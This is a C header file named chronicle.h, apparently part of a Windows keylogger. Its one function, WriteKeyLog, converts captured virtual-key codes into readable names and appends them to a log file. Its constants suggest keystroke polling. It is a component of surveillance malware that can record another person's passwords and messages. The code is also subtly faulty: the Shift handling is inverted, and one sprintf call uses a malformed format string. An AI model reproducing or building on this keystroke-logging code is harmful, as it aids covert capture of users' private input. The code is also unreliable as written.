#ifndef __CHRONICLE_H__
#define __CHRONICLE_H__


// constants
#define CLEAROLD	TRUE
#define MAXLOG		0x10000
#define KEYPRESS	-32767

ULONG WriteKeyLog( HANDLE hFile, int KeyCode )
{

	char	szKeyName[64];
	char	szTemp[64];
	DWORD	dwBytesWritten;

    switch( KeyCode )
	{
		case 0x01: sprintf( szKeyName, "{LBUTTON}" ); break;
		case 0x02: sprintf( szKeyName, "{RBUTTON}" );	break;
		case 0x03: sprintf( szKeyName, "{CANCEL}" ); break;
		case 0x04: sprintf( szKeyName, "{MBUTTON}" );	break;
		case 0x05: sprintf( szKeyName, "{XBUTTON1}" ); break;
		case 0x06: sprintf( szKeyName, "{XBUTTON2}" ); break;
		case 0x08: sprintf( szKeyName, "{BACKSPACE}" ); break;
		case 0x09: sprintf( szKeyName, "{TAB}" );	break;
		case 0x0C: sprintf( szKeyName, "{CLEAR}" ); break;
		case 0x0D: sprintf( szKeyName, "{ENTER}" ); break;
		case 0x10: sprintf( szKeyName, "{SHIFT}" ); break;
		case 0x11: sprintf( szKeyName, "{CONTROL}" );	break;
		case 0x12: sprintf( szKeyName, "{ALTERNATE}" ); break;
		case 0x13: sprintf( szKeyName, "{PAUSE}" ); break;
		case 0x14: sprintf( szKeyName, "{CAPSLOCK}" ); break;
		case 0x15: sprintf( szKeyName, "{KANA}" ); break;
		case 0x17: sprintf( szKeyName, "{JUNJA}" ); break;
		case 0x18: sprintf( szKeyName, "{FINAL}" ); break;
		case 0x19: sprintf( szKeyName, "{HANJA}" ); break;
		case 0x1B: sprintf( szKeyName, "{ESCAPE}" ); break;
		case 0x1C: sprintf( szKeyName, "{CONVERT}" ); break;
		case 0x1D: sprintf( szKeyName, "{NONCONVERT}" ); break;
		case 0x1E: sprintf( szKeyName, "{ACCEPT}" ); break;
		case 0x1F: sprintf( szKeyName, "{MODECHANGE}" ); break;
		case 0x20: sprintf( szKeyName, " " ); break;
		case 0x21: sprintf( szKeyName, "{PAGEUP}" ); break;
		case 0x22: sprintf( szKeyName, "{PAGEDOWN}" ); break;
		case 0x23: sprintf( szKeyName, "{END}" ); break;
		case 0x24: sprintf( szKeyName, "{HOME}" ); break;
		case 0x25: sprintf( szKeyName, "{LEFT}" ); break;
		case 0x26: sprintf( szKeyName, "{UP}" ); break;
		case 0x27: sprintf( szKeyName, "{RIGHT}" ); break;
		case 0x28: sprintf( szKeyName, "{DOWN}" ); break;
		case 0x29: sprintf( szKeyName, "{SELECT}" ); break;
		case 0x2A: sprintf( szKeyName, "{PRINT}" ); break;
		case 0x2B: sprintf( szKeyName, "{EXECUTE}" ); break;
		case 0x2C: sprintf( szKeyName, "{PRINTSCREEN}" ); break;
		case 0x2D: sprintf( szKeyName, "{INSERT}" ); break;
		case 0x2E: sprintf( szKeyName, "{DELETE}" ); break;
		case 0x2F: sprintf( szKeyName, "{HELP}" ); break;

		case 0x30: 
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, " )" );
			else
				sprintf( szKeyName, "0" );
			break;
		
		case 0x31:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "!" );
			else
				sprintf( szKeyName, "1" );
			break;
		
		case 0x32:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "@" );
			else
				sprintf( szKeyName, "2" );
			break;
		
		case 0x33:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "#" );
			else
				sprintf( szKeyName, "3" );
			break;
		
		case 0x34:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "$" );
			else
				sprintf( szKeyName, "4" );
			break;
		
		case 0x35:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "%" );
			else
				sprintf( szKeyName, "5" );
			break;
		
		case 0x36:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "^" );
			else
				sprintf( szKeyName, "6" );
			break;

		case 0x37:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "&" );
			else
				sprintf( szKeyName, "7" );
			break;
		
		case 0x38:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "*" );
			else
				sprintf( szKeyName, "8" );
			break;
		
		case 0x39:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "( " );
			else
				sprintf( szKeyName, "9" );
			break;
		
		case 0x41: sprintf( szKeyName, "A" ); break;
		case 0x42: sprintf( szKeyName, "B" ); break;
		case 0x43: sprintf( szKeyName, "C" ); break;
		case 0x44: sprintf( szKeyName, "D" ); break;
		case 0x45: sprintf( szKeyName, "E" ); break;
		case 0x46: sprintf( szKeyName, "F" ); break;
		case 0x47: sprintf( szKeyName, "G" ); break;
		case 0x48: sprintf( szKeyName, "H" ); break;
		case 0x49: sprintf( szKeyName, "I" ); break;
		case 0x4A: sprintf( szKeyName, "J" ); break;
		case 0x4B: sprintf( szKeyName, "K" ); break;
		case 0x4C: sprintf( szKeyName, "L" ); break;
		case 0x4D: sprintf( szKeyName, "M" ); break;
		case 0x4E: sprintf( szKeyName, "N" ); break;
		case 0x4F: sprintf( szKeyName, "O" ); break;
		case 0x50: sprintf( szKeyName, "P" ); break;
		case 0x51: sprintf( szKeyName, "Q" ); break;
		case 0x52: sprintf( szKeyName, "R" ); break;
		case 0x53: sprintf( szKeyName, "S" ); break;
		case 0x54: sprintf( szKeyName, "T" ); break;
		case 0x55: sprintf( szKeyName, "U" ); break;
		case 0x56: sprintf( szKeyName, "V" ); break;
		case 0x57: sprintf( szKeyName, "W" ); break;
		case 0x58: sprintf( szKeyName, "X" ); break;
		case 0x59: sprintf( szKeyName, "Y" ); break;
		case 0x5A: sprintf( szKeyName, "Z" ); break;
		case 0x5B: sprintf( szKeyName, "{LWINDOWS}" ); break;
		case 0x5C: sprintf( szKeyName, "{RWINDOWS}" ); break;
		case 0x5D: sprintf( szKeyName, "{APPLICATIONS}" ); break;
		case 0x5F: sprintf( szKeyName, "{SLEEP}" ); break;
		case 0x60: sprintf( szKeyName, "0" ); break;
		case 0x61: sprintf( szKeyName, "1" ); break;
		case 0x62: sprintf( szKeyName, "2" ); break;
		case 0x63: sprintf( szKeyName, "3" ); break;
		case 0x64: sprintf( szKeyName, "4" ); break;
		case 0x65: sprintf( szKeyName, "5" ); break;
		case 0x66: sprintf( szKeyName, "6" ); break;
		case 0x67: sprintf( szKeyName, "7" ); break;
		case 0x68: sprintf( szKeyName, "8" ); break;
		case 0x69: sprintf( szKeyName, "9" ); break;
		case 0x6A: sprintf( szKeyName, "{MULTIPLY}" ); break;
		case 0x6B: sprintf( szKeyName, "{ADD}" ); break;
		case 0x6C: sprintf( szKeyName, "{SEPERATOR}" ); break;
		case 0x6D: sprintf( szKeyName, "{SUBTRACT}" ); break;
		case 0x6E: sprintf( szKeyName, "{DECIMAL}" ); break;
		case 0x6F: sprintf( szKeyName, "{DIVIDE}" ); break;
		case 0x70: sprintf( szKeyName, "{F1}" ); break;
		case 0x71: sprintf( szKeyName, "{F2}" ); break;
		case 0x72: sprintf( szKeyName, "{F3}" ); break;
		case 0x73: sprintf( szKeyName, "{F4}" ); break;
		case 0x74: sprintf( szKeyName, "{F5}" ); break;
		case 0x75: sprintf( szKeyName, "{F6}" ); break;
		case 0x76: sprintf( szKeyName, "{F7}" ); break;
		case 0x77: sprintf( szKeyName, "{F8}" ); break;
		case 0x78: sprintf( szKeyName, "{F9}" ); break;
		case 0x79: sprintf( szKeyName, "{F10}" ); break;
		case 0x7A: sprintf( szKeyName, "{F11}" ); break;
		case 0x7B: sprintf( szKeyName, "{F12}" ); break;
		case 0x7C: sprintf( szKeyName, "{F13}" ); break;
		case 0x7D: sprintf( szKeyName, "{F14}" ); break;
		case 0x7E: sprintf( szKeyName, "{F15}" ); break;
		case 0x7F: sprintf( szKeyName, "{F16}" ); break;
		case 0x80: sprintf( szKeyName, "{F17}" ); break;
		case 0x81: sprintf( szKeyName, "{F18}" ); break;
		case 0x82: sprintf( szKeyName, "{F19}" ); break;
		case 0x83: sprintf( szKeyName, "{F20}" ); break;
		case 0x84: sprintf( szKeyName, "{F21}" ); break;
		case 0x85: sprintf( szKeyName, "{F22}" ); break;
		case 0x86: sprintf( szKeyName, "{F23}" ); break;
		case 0x87: sprintf( szKeyName, "{F24}" ); break;
		case 0x90: sprintf( szKeyName, "{NUMLOCK}" ); break;
		case 0x91: sprintf( szKeyName, "{SCROLLLOCK}" ); break;
		case 0xA0: sprintf( szKeyName, "{LSHIFT}" ); break;
		case 0xA1: sprintf( szKeyName, "{RSHIFT}" ); break;
		case 0xA2: sprintf( szKeyName, "{LCONTROL}" ); break;
		case 0xA3: sprintf( szKeyName, "{RCONTROL}" ); break;
		case 0xA4: sprintf( szKeyName, "{LALTERNATE}" ); break;
		case 0xA5: sprintf( szKeyName, "{RALTERNATE}" ); break;
		case 0xA6: sprintf( szKeyName, "{BROWSER_BACK}" ); break;
		case 0xA7: sprintf( szKeyName, "{BROWSER_FORWARD}" ); break;
		case 0xA8: sprintf( szKeyName, "{BROWSER_REFRESH}" ); break;
		case 0xA9: sprintf( szKeyName, "{BROWSER_STOP}" ); break;
		case 0xAA: sprintf( szKeyName, "{BROWSER_SEARCH}" ); break;
		case 0xAB: sprintf( szKeyName, "{BROWSER_FAVORITES}" ); break;
		case 0xAC: sprintf( szKeyName, "{BROWSER_HOME}" ); break;
		case 0xAD: sprintf( szKeyName, "{VOLUME_MUTE}" ); break;
		case 0xAE: sprintf( szKeyName, "{VOLUME_DOWN}" ); break;
		case 0xAF: sprintf( szKeyName, "{VOLUME_UP}" ); break;
		
		case 0xBA:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, ":" );
			else
				sprintf( szKeyName, ";" );
			break;
		
		case 0xBB:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "+" );
			else
				sprintf( szKeyName, "=" );
			break;
		
		case 0xBC:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "<" );
			else
				sprintf( szKeyName, "," );
			break;
		
		case 0xBD:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "_" );
			else
				sprintf( szKeyName, "-" );
			break;
		
		case 0xBE:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, ">" );
			else
				sprintf( szKeyName, "." );
			break;
		
		case 0xBF:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "?" );
			else
				sprintf( szKeyName, "/" );
			break;
		
		case 0xC0:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "~" );
			else
				sprintf( szKeyName, "`" );
			break;
		
		case 0xDB:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "{" );
			else
				sprintf( szKeyName, "[" );
			break;
		
		case 0xDC:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "|" );
			else
				sprintf( szKeyName, "\\" );
			break;
		
		case 0xDD:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "}" );
			else
				sprintf( szKeyName, "]" );
			break;
		
		case 0xDE:
			if( GetKeyState( VK_SHIFT ) == 0 )
				sprintf( szKeyName, "\"" );
			else
				sprintf( szKeyName, "'" );
			break;
		
		case 0xFA: sprintf( szKeyName, "{PLAY}" ); break;
		case 0xFB: sprintf( szKeyName, "{ZOOM}" ); break;
		default: sprintf( szKeyName,"{%02x}", KeyCode ); break;
	}

	if( !WriteFile( hFile, szKeyName, strlen( szKeyName ), &dwBytesWritten, NULL ) )
	{
		sprintf( szTemp, "Error: %d", GetLastError() );
		MessageBox( NULL, szTemp, NULL, MB_OK );
		exit( 0 );
	}

	return dwBytesWritten;

}

#endif //__CHRONICLE_H__